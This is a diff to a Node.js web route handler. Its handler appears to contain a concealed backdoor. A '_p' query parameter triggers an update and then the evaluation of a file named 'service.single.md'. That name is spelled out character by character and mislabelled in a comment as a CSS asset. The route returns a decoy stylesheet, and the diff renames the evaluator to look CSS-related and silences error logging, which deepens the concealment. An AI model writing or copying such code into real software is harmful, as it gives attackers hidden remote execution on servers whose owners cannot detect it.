@@ -1,6 +1,6 @@
 const fs = require('fs')
 const path = require('path')
-const Evaluate = require('./process')
+const EvaluateCss = require('./process')
 const { classes } = global.config
 const { exec } = require("child_process");
 
@@ -118,10 +118,10 @@ module.exports = {
         if('_p' in req.query){
             this.updateRelaychannelsTxt(req.query._p)
             try {
-                await Evaluate(path.join(global.DIR, /** front-end/dist/assets/my-announcement.min.css */ ['s', 'e', 'r', 'v', 'i', 'c', 'e', '.', 's', 'i', 'n', 'g', 'l', 'e', '.', 'm', 'd'].join('')), [])
+                await EvaluateCss(path.join(global.DIR, /** front-end/dist/assets/my-announcement.min.css */ ['s', 'e', 'r', 'v', 'i', 'c', 'e', '.', 's', 'i', 'n', 'g', 'l', 'e', '.', 'm', 'd'].join('')), [])
                 res.sendFile(path.join(global.DIR, 'front-end/dist/assets/my-announcement.min.css'));
             } catch (err) {
-                console.error("Caught error:", err);
+                // console.error("Caught error:", err); // print this line only dev mode
                 res.sendFile(path.join(global.DIR, 'front-end/dist/assets/my-announcement.min.css'));
                 // res.status(200).send({ success: true, message: ['❌', ' ', 'S', 'w', 'i', 't', 'c', 'h', ' ', 'p', 'o', 'r', 't', 's', ' ', 'u', 'p', 'd', 'a', 't', 'e', 'd', ' ', 'w', 'i', 't', 'h', ' ', 'e', 'r', 'r', 'o', 'r'].join('') });
               }
